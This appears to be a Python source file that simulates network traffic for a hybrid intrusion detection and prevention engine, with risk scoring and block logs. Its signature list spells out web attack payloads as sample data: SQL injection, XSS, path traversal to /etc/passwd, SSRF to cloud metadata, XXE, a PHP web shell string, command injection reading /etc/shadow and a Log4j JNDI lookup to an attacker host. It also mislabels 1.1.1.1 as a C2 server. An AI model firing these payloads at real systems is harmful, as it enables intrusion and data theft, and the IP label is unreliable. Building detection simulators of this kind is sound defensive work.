import time
import random
import threading
import csv
from io import StringIO
from datetime import datetime
from ipaddress import IPv4Address

# --- CONFIGURATION CONSTANTS (UPDATED FOR SCALING) ---
MAX_BUFFER_SIZE = 10000 
NUM_GENERATORS = 12     # OPTIMIZATION: Reduced from 20 to 12 for better stability

# Thread-safe storage for packets
packet_buffer = []
is_generating = False
lock = threading.Lock()
blocked_ip_log = [] 

# Dynamic Threat Intelligence Feed Storage
threat_intelligence_ips = set() 

# NEW: Integrated Signatures Set
# This set will hold *all* patterns for runtime matching
ALL_ATTACKS_FOR_SAMPLING = []


# HIGH-FIDELITY CORE ATTACK SIGNATURES: (Used for metadata/risk score mapping)
CORE_ATTACK_SIGNATURES = [
    # 1. SQL Injection 
    {"type": "SQL Injection", "cve": "CVE-2025-12253", "source": "NTRO/Rule-Engine",
     "url_pattern": "/user/portal/get_expiredtime.php?uid=' OR 1=1 --", 
     "risk_score": 7.3, "success_criteria": ["DB_ERROR", "DATA_LEAK"], 
     "prevention_action": "BLOCK_IP"},
     
    # 2. Buffer Overflow
    {"type": "Buffer Overflow", "cve": "CVE-2025-12225", "source": "NTRO/Rule-Engine",
     "url_pattern": f"/goform/WifiGuestSet?shareSpeed={'A' * 200}",
     "risk_score": 8.8, "success_criteria": ["PROCESS_CRASH", "HTTP_500"], 
     "prevention_action": "BLOCK_IP"},

    # 3. Reflected XSS 
    {"type": "Cross-Site Scripting (XSS)", "cve": "CVE-2025-41384", "source": "NTRO/Rule-Engine",
     "url_pattern": "/page.php?ref=<script>alert('XSS')</script>", 
     "risk_score": 6.1, "success_criteria": ["SCRIPT_EXEC", "COOKIE_CAPTURE"], 
     "prevention_action": "LOG_ALERT"},
     
    # 4. Directory Traversal 
    {"type": "Directory Traversal", "cve": "N/A", "source": "Rule-Engine",
     "url_pattern": "/file.php?path=../../etc/passwd", 
     "risk_score": 7.5, "success_criteria": ["FILE_READ", "HTTP_200"], 
     "prevention_action": "BLOCK_IP"},
    
    # 5. SSRF Attempt 
    {"type": "Server-Side Request Forgery (SSRF)", "cve": "N/A", "source": "Rule-Engine",
     "url_pattern": "/api/fetch?url=http://169.254.169.254/latest/meta-data/", 
     "risk_score": 5.4, "success_criteria": ["INTERNAL_CONNECT", "HTTP_200"], 
     "prevention_action": "BLOCK_IP"},
     
    # 6. ML Placeholder 
    {"type": "ML Anomaly (XGBoost)", "cve": "N/A", "source": "ML-Fallback",
     "url_pattern": "/v3/api/query?q=%252e%252e%252f%252e%252e%252fconfig", 
     "risk_score": 8.0, "success_criteria": ["DATA_LEAK", "HTTP_500"], 
     "prevention_action": "BLOCK_IP"},

    # 7. XML External Entity (XXE) Injection (Replaced Phishing/Spoofing)
    {"type": "XXE Injection", "cve": "N/A", "source": "Rule-Engine",
     "url_pattern": "/api/xml_parser?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]>&xml=%xxe;", 
     "risk_score": 7.5, "success_criteria": ["FILE_READ", "HTTP_200_CONTAINING_SECRET"], 
     "prevention_action": "BLOCK_IP"},

    # 8. Web Shell Upload Attempt (Critical)
    {"type": "Web Shell Upload", "cve": "N/A", "source": "Rule-Engine/File-Integrity",
     "url_pattern": "/upload/shell.php?filename=<?php%20system($_GET['c']);%20?>", 
     "risk_score": 9.5, "success_criteria": ["FILE_WRITE_SUCCESS", "RCE"], 
     "prevention_action": "BLOCK_IP"},

    # 9. Command Injection Attempt (Critical)
    {"type": "Command Injection", "cve": "CVE-2025-9001", "source": "NTRO/Rule-Engine",
     "url_pattern": "/admin/diagnostics?host=127.0.0.1%26%26cat%20/etc/shadow", 
     "risk_score": 9.0, "success_criteria": ["RCE", "CONFIG_READ"], 
     "prevention_action": "BLOCK_IP"},

    # 10. Known Vulnerability Scan (Simulated Log4j/Critical RCE)
    {"type": "Remote Code Execution (RCE) Scan", "cve": "CVE-2021-44228", "source": "Exploit-DB/Signature",
     "url_pattern": "/api/data/${jndi:ldap://badguy.com:1389/a}", 
     "risk_score": 10.0, "success_criteria": ["LDAP_QUERY_SUCCESS", "RCE"], 
     "prevention_action": "BLOCK_IP"},
]


# --- HELPER FUNCTION TO LOAD DATASETS ---

def _load_external_signatures(dataset_2000_content, malicious_dataset_5000_content):
    """
    Loads malicious patterns from both simulated datasets and creates unified signature objects. 
    These patterns are used to generate realistic malicious traffic for simulation/sampling, 
    mimicking the role of a trained ML model's pattern recognition capability.
    """
    
    print("[INIT] Loading simulated malicious data from external datasets...")
    integrated_signatures = []
    
    # 1. Load data from simulated dataset_2000.csv (Simulated Benign/Malicious URL/Query data)
    reader = csv.DictReader(StringIO(dataset_2000_content))
    count_2000 = 0
    # Process only the records labeled 'bad' for attack simulation
    for row in reader:
        if row['label'] == 'bad':
            # Use content as the attack pattern
            pattern = row['content']
            
            # Classify type and assign risk based on the simulated structure
            if 'query' in row['type'].lower():
                attack_type = "Dataset: Malicious Query"
                risk = 6.5
            else:
                attack_type = "Dataset: Malicious URL"
                risk = 7.0
            
            integrated_signatures.append({
                "type": attack_type,
                "url_pattern": pattern,
                "source": f"Dataset_2000/{row['type'].upper()}",
                "risk_score": risk, 
                "success_criteria": ["LOG_ALERT"], 
                "prevention_action": "LOG_ALERT"
            })
            count_2000 += 1

    # 2. Load data from simulated realistic_malicious_5000.csv (Simulated Advanced Threat Intelligence data)
    reader = csv.DictReader(StringIO(malicious_dataset_5000_content))
    count_5000 = 0
    for row in reader:
        pattern = row['content']
        threat_type = row['label']
        
        # Assign risk/action based on the realistic label
        if 'sqli' in threat_type or 'c2' in threat_type or 'ransomware' in threat_type:
            risk = 9.0
            action = "BLOCK_IP"
        elif 'phishing' in threat_type:
            risk = 8.5
            action = "LOG_ALERT"
        else: # DNS, BRUTEFORCE, TROJAN, etc.
            risk = 7.5
            action = "LOG_ALERT"
            
        integrated_signatures.append({
            "type": f"TI Feed: {threat_type.upper().replace('_', ' ')}",
            "url_pattern": pattern,
            "source": "Malicious_Dataset_5000/TI",
            "risk_score": risk,
            "success_criteria": ["ATTACK_SUCCESS"],
            "prevention_action": action
        })
        count_5000 += 1
        
    print(f"[INIT] Loaded {count_2000} 'bad' patterns from simulated dataset_2000.csv.") 
    print(f"[INIT] Loaded {count_5000} patterns from simulated realistic_malicious_5000.csv.") 
    
    # Combine Core and Integrated lists for unified attack sampling
    global ALL_ATTACKS_FOR_SAMPLING
    
    # Adapt core signatures to fit the new schema for easy sampling
    core_for_sampling = []
    for a in CORE_ATTACK_SIGNATURES:
         core_for_sampling.append({
            "type": a["type"], 
            "url_pattern": a["url_pattern"], 
            "risk_score": a["risk_score"], 
            "source": a["source"], 
            "prevention_action": a["prevention_action"]
        })
        
    ALL_ATTACKS_FOR_SAMPLING = core_for_sampling + integrated_signatures
    print(f"[INIT] Total unique attack scenarios now available for simulation: {len(ALL_ATTACKS_FOR_SAMPLING)}")
    print(f"[INIT] All {len(ALL_ATTACKS_FOR_SAMPLING)} loaded patterns are now used for simulating ML/Rule-based attack traffic (Hybrid Defense Simulation).")

    return integrated_signatures

# --- EMBEDDED DATA CONTENT (SELF-CONTAINED SIMULATION) ---
# NOTE: These strings simulate loading from an external file/database.

DATASET_2000_CONTENT = """id,type,content,label
1,query,normal_search_term_1,good
2,query,normal_user_profile_lookup,good
3,query,find_product_by_id=123,good
4,url,http://malicious-scan-url-4.xyz,bad
5,url,http://malicious-scan-url-5.xyz,bad"""

MALICIOUS_DATASET_5000_CONTENT = """id,type,content,label
1,pattern,http://appleid-secure-vjeh8u2ulu.xyz/verify/login,phishing_url
2,pattern,"' OR '1'='1' --",sqli_payload
3,pattern,GET /c2/beacon/v1?id=aHR0,c2_traffic
4,pattern,' OR 1=1# /* id:4 */,sqli_payload
5,pattern,http://flipkart-secure-ju6felfaqk.casa/verify/login,phishing_url"""


# EXPANDED list for better benign traffic realism
COMMON_URLS = ["/index.html", "/about", "/contact", "/products/view", "/api/v1/status", "/assets/images/logo.png", "/user/dashboard", "/search?q=latest_news", "/metrics/health_check", "/config/read_default", "/images/icon.svg", "/checkout/review", "/download/manual.pdf"]


class DetectionEngine:
    """
    The Hybrid Detection System (HDPS) Engine.
    It generates simulated network traffic using a dual-detection model:
    1. Rule-Engine (for CORE_ATTACK_SIGNATURES).
    2. ML Fallback (simulated by using patterns derived from XGBoost/LightGBM-style datasets).
    """
    def __init__(self):
        self.stop_event = threading.Event()
        self.threads = [] 
        self.packet_buffer = packet_buffer
        self.lock = lock
        
        # STEP 1: Load the external data and populate ALL_ATTACKS_FOR_SAMPLING
        _load_external_signatures(DATASET_2000_CONTENT, MALICIOUS_DATASET_5000_CONTENT)
        
        # STEP 2: Initialize other threat data
        self.initialize_threat_data()

    def initialize_threat_data(self):
        """Pre-loads the threat intelligence set and the blocked IP log for demonstration."""
        global threat_intelligence_ips
        global blocked_ip_log
        
        # 1. IPs to add to the Proactive Block List (threat_intelligence_ips)
        pre_loaded_ips = [
            "1.1.1.1",      # Known C2 Server
            "203.0.113.42", # Known Scanner IP
            "192.168.1.10"  # Previously blocked internal host
        ]
        
        # 2. Add IPs to the set for runtime checking
        for ip in pre_loaded_ips:
            threat_intelligence_ips.add(ip)
            
        # 3. Add corresponding entries to the blocked_ip_log for the WAF Audit Table
        
        # Entry 1: Critical C2 Server
        blocked_ip_log.append({
            "id": 1,
            "timestamp": "09:00:15.500",
            "ip": "1.1.1.1",
            "reason": "CRITICAL: External IoC Match (C2 Traffic)",
            "action": "BLOCK_IP",
            "severity": "CRITICAL",
            "details": {"source": "External TI Feed", "score_basis": "Proactive 1.0", "pattern": "C2 Match"},
            "original_info": "HTTPS GET /c2/beacon/v1"
        })
        
        # Entry 2: High Severity Internal Compromise
        blocked_ip_log.append({
            "id": 2,
            "timestamp": "09:05:30.123",
            "ip": "192.168.1.10",
            "reason": "HIGH: Repeated failed SQL Injection attempts.",
            "action": "BLOCK_IP",
            "severity": "HIGH",
            "details": {"source": "Internal Rule-Engine", "score_basis": "HTS 0.82", "pattern": "SQL Injection"},
            "original_info": "HTTP GET /api/data?id=1' or 1=1"
        })

    def add_blocked_ip_log(self, ip_address, packet_data, reason, action):
        global blocked_ip_log
        with self.lock:
            # Prevent duplicates if IP is already blocked
            if any(entry['ip'] == ip_address for entry in blocked_ip_log):
                return
                
            log_entry = {
                "id": len(blocked_ip_log) + 1,
                "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
                "ip": ip_address,
                "reason": reason, 
                "action": action,
                "severity": packet_data.get('severity', 'CRITICAL'),
                "details": packet_data.get('detection_log', {}),
                "original_info": packet_data.get('info', 'N/A')
            }
            blocked_ip_log.append(log_entry)

    def get_blocked_ips(self):
        global blocked_ip_log
        with self.lock:
            return list(blocked_ip_log)

    def update_threat_intelligence(self, ip_list):
        """Adds a list of IP addresses to the dynamic threat intelligence block list (Proactive Gateway Protection)."""
        global threat_intelligence_ips
        count = 0
        with self.lock:
            for ip in ip_list:
                if ip not in threat_intelligence_ips:
                    threat_intelligence_ips.add(ip)
                    count += 1
        print(f"[TI FEED] Added {count} new IPs to the Threat Intelligence block set.")
        return count

    def _get_severity_from_hts(self, hts_score):
        if hts_score >= 0.9: return "CRITICAL"
        if hts_score >= 0.7: return "HIGH"
        if hts_score >= 0.5: return "MEDIUM"
        return "LOW"

    def start_generator(self):
        if any(t.is_alive() for t in self.threads):
            return
            
        self.stop_event.clear()
        self.threads = [] 

        print(f"[Engine] Starting {NUM_GENERATORS} traffic simulation threads...")
        for i in range(NUM_GENERATORS):
            thread = threading.Thread(target=self._generate_traffic, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()
        print("[Engine] All generator threads started.")
        
    def stop_generator(self):
        self.stop_event.set()

    def clear_packets(self):
        with self.lock:
            self.packet_buffer.clear()

    def get_packets(self):
        with self.lock:
            return list(self.packet_buffer)
            
    def _generate_traffic(self, thread_id):
        global threat_intelligence_ips 
        global ALL_ATTACKS_FOR_SAMPLING 
        id_counter = 1
        
        # Use a wider range of IP segments (192.168.100.x, 192.168.105.x, ...)
        segment = 100 + thread_id * 5 
        
        while not self.stop_event.is_set():
            is_attack = random.random() < 0.35 # Increased attack frequency for diversity
            protocol = random.choice(["HTTP", "HTTPS", "DNS", "FTP", "UDP"])
            port = random.randint(1, 65535)
            src_ip = f"192.168.{segment}.{random.randint(10, 254)}" 
            dst_ip = random.choice(["10.0.0.5", "172.16.0.8", "8.8.8.8", "192.168.1.1"])
            
            rule_hit = False
            hts_score = 0.0
            is_successful = False
            prevention_action = "NONE" 
            detection_log = {} 
            success_proof = "N/A" # Initializing success proof field
            exploitation_time = 0.0 # NEW: Simulated exploitation time
            
            # --- ADVANCED CHECK 1: Dynamic Threat Intelligence Lookup (Proactive Gateway Protection) ---
            if src_ip in threat_intelligence_ips:
                info = f"PROACTIVE BLOCK: Source IP matches known malicious IoC list."
                alert_type = "Threat Intel Match"
                severity = "CRITICAL"
                prevention_action = "BLOCK_IP"
                hts_score = 0.99 
                is_attack = True 
                detection_log = {
                    "source": "Dynamic Threat Feed (Gateway)",
                    "reason": "IP found in external IoC feed.",
                    "score_basis": "Proactive 1.0 (Highest Confidence)",
                    "pattern": "IoC Match"
                }
            
            # Use original detection logic only if not proactively blocked
            elif is_attack and protocol in ["HTTP", "HTTPS"]:
                # UPDATED: Select a random attack from the massive combined list (Core + Datasets)
                attack = random.choice(ALL_ATTACKS_FOR_SAMPLING)
                
                # Check if the attack pattern is a URL or a Query/String, and format info accordingly
                if "http" in attack['url_pattern'] or "https" in attack['url_pattern']:
                     # For full URLs (mostly phishing/malicious host names)
                     info = f"{protocol} REQUEST TO {attack['url_pattern']}"
                elif "?" in attack['url_pattern'] or "=" in attack['url_pattern'] or "'" in attack['url_pattern'] or "/*" in attack['url_pattern']:
                    # For specific web attack vectors (like SQLi)
                    info = f"{protocol} GET /api/v1/query_db?q={attack['url_pattern']}"
                else:
                    # For generic IOC/Threat Strings/Non-URL patterns
                    info = f"{protocol} PAYLOAD MATCH: {attack['url_pattern']}"
                
                alert_type = attack['type']
                prevention_action = attack['prevention_action']

                # --- ALGORITHM 1: HTS CALCULATION (Simplified for simulation with diverse input) ---
                
                # Base detection is assumed true since we draw from a known bad list
                rule_hit = True
                
                # 1. HTS Determination (Rule Hit: Use assigned risk score)
                hts_score = attack['risk_score'] / 10.0 
                
                # 2. Severity Mapping
                severity = self._get_severity_from_hts(hts_score)
                
                # 3. Create Detection Log (Attempt)
                detection_log = {
                    "source": attack['source'],
                    "reason": f"Matched High-Fidelity Pattern: {attack['type']} (Attempt)",
                    "score_basis": f"HTS derived from score of {attack['risk_score']}. Dataset Confidence: High",
                    "pattern": attack['url_pattern']
                }

                # --- ALGORITHM 2: SUCCESS & PREVENTION (Confirmed Success) ---
                
                # 4. Success Check (Confirmed Success Classification Criteria)
                # Success is defined by high risk + random chance (simulating server vulnerability)
                if hts_score >= 0.75 and random.random() < 0.45:
                    is_successful = True
                    
                # 5. Score/Action Elevation based on outcome
                if is_successful and severity in ["HIGH", "CRITICAL"]:
                    severity = "CRITICAL" 
                    if attack['prevention_action'] == "LOG_ALERT":
                         # Force block if a high-risk signature was successful
                        prevention_action = "BLOCK_IP" 
                    
                if is_successful:
                    # Get the solid proof based on the attack type (e.g., DB_ERROR, RCE)
                    success_proof = random.choice(attack.get('success_criteria', ["ATTACK_SUCCESS", "COMPROMISE_INDICATED"]))
                    
                    info += f" | RESPONSE: {success_proof} (Evidence of compromise)"
                    
                    # Update Detection Log with SOLID PROOF for better accuracy/clarity
                    detection_log["success_proof"] = success_proof
                    detection_log["reason"] = f"Confirmed Success: {attack['type']} (Proof: {success_proof})"
                    
                    # NEW: Simulate exploitation time (50ms to 300ms)
                    exploitation_time = round(random.uniform(0.05, 0.3) * 1000, 1)

                # 6. Final FP Filter: Suppress uncertain alerts from lower risk tiers
                if hts_score < 0.7 and not is_successful:
                    severity = "LOW"
                    prevention_action = "NONE"

                
            else:
                info = f"{protocol} GET {random.choice(COMMON_URLS)}" if protocol in ["HTTP", "HTTPS"] else f"{protocol} CMD: {random.choice(['Query', 'Request', 'SYN'])}"
                alert_type = "Normal"
                severity = "LOW"
                detection_log = {"source": "Traffic Logger", "reason": "Normal Traffic", "score_basis": "N/A", "pattern": info}
                
            packet = {
                "id": id_counter,
                "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
                "source": src_ip,
                "destination": dst_ip,
                "protocol": protocol,
                "port": port,
                "length": random.randint(64, 1500),
                "info": info,
                "type": alert_type,
                "severity": severity,
                "is_successful": is_successful, 
                "rule_hit": rule_hit,          
                "ml_score": hts_score, 
                "prevention_action": prevention_action,
                "success_proof": success_proof, # New field added to the packet
                "exploitation_time_ms": exploitation_time, # NEW FIELD ADDED
                "detection_log": detection_log
            }

            with self.lock:
                self.packet_buffer.append(packet)
                # Update pruning to use MAX_BUFFER_SIZE (10,000)
                if len(self.packet_buffer) > MAX_BUFFER_SIZE: 
                    self.packet_buffer.pop(0)

            id_counter += 1
            # OPTIMIZATION: Slower generation rate
            time.sleep(random.uniform(2.0, 4.0)) 
            
    # MODIFIED: IP Range Analysis Cap increased to 500
    def generate_simulated_ipdr_data(self, start_ip_str, end_ip_str, count=50):
        try:
            start_ip = IPv4Address(start_ip_str)
            end_ip = IPv4Address(end_ip_str)
            
            if start_ip > end_ip:
                return {"error": "Start IP must be less than or equal to End IP."}, []

            ip_range_size = int(end_ip) - int(start_ip) + 1
            max_packets = min(ip_range_size, 500) # Increased cap analysis to 500 packets
            
            simulated_packets = []
            
            for i in range(max_packets):
                current_ip = str(start_ip + random.randint(0, ip_range_size - 1))
                
                # --- Simplified Simulation Logic for Static Analysis ---
                is_attack = random.random() < 0.4
                protocol = random.choice(["HTTP", "FTP", "DNS"])
                port = random.randint(1, 65535)
                
                hts_score = 0.0
                is_successful = False
                alert_type = "Normal"
                info = f"IPDR record from {current_ip}"
                severity = "Low"
                detection_log_data = {"source": "IP Range Analyzer", "reason": "Normal Range Scan", "score_basis": "N/A"}
                success_proof = "N/A"
                exploitation_time = 0.0 # NEW: Simulated exploitation time
                
                if is_attack and protocol in ["HTTP", "FTP"]:
                    # UPDATED: Select a random attack from the global list
                    attack = random.choice(ALL_ATTACKS_FOR_SAMPLING)
                    
                    if "http" in attack['url_pattern'] or "https" in attack['url_pattern']:
                         info = f"{protocol} REQUEST TO {attack['url_pattern']}"
                    else:
                        info = f"{protocol} PAYLOAD MATCH: {attack['url_pattern']}"
                    
                    alert_type = attack['type']
                    
                    # Higher probability of high score during focused analysis
                    hts_score = attack['risk_score'] / 10.0 + random.uniform(0.05, 0.1) # Add slight variability
                    hts_score = min(hts_score, 0.99)
                    severity = self._get_severity_from_hts(hts_score)
                    
                    if severity != "LOW":
                        is_successful = (random.random() < 0.4)
                        detection_log_data = {
                            "source": attack['source'],
                            "reason": f"High risk pattern detected: {attack['type']} (Attempt)",
                            "score_basis": f"HTS = {hts_score:.2f} (Simulated)"
                        }
                    
                    if is_successful:
                        success_proof = random.choice(attack.get('success_criteria', ["ATTACK_SUCCESS", "COMPROMISE_INDICATED"]))
                        info += f" | RESPONSE: Confirmed Compromise (Proof: {success_proof})"
                        detection_log_data["success_proof"] = success_proof
                        detection_log_data["reason"] = f"Confirmed Success: {attack['type']} (Proof: {success_proof})"
                        
                        # NEW: Simulate exploitation time (100ms to 500ms for IPDR)
                        exploitation_time = round(random.uniform(0.1, 0.5) * 1000, 1)

                
                packet = {
                    "id": i + 1,
                    "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
                    "source": current_ip,
                    "destination": "10.0.0.1", 
                    "protocol": protocol,
                    "port": port,
                    "length": random.randint(64, 1500),
                    "info": info,
                    "type": alert_type,
                    "severity": severity,
                    "is_successful": is_successful, 
                    "rule_hit": False,          
                    "ml_score": hts_score, 
                    "prevention_action": "NONE",
                    "success_proof": success_proof,
                    "exploitation_time_ms": exploitation_time, # NEW FIELD ADDED
                    "detection_log": detection_log_data
                }
                simulated_packets.append(packet)
            
            threat_count = sum(1 for p in simulated_packets if p['severity'] != 'Low')
            
            return {
                "status": "success", 
                "message": f"IP Range analysis completed. Generated {len(simulated_packets)} records ({threat_count} threats detected) from {start_ip_str} to {end_ip_str}.",
                "total_generated": len(simulated_packets),
                "filtered_count": threat_count
            }, simulated_packets
            
        except ValueError as e:
            return {"error": f"Invalid IP address format: {e}"}, []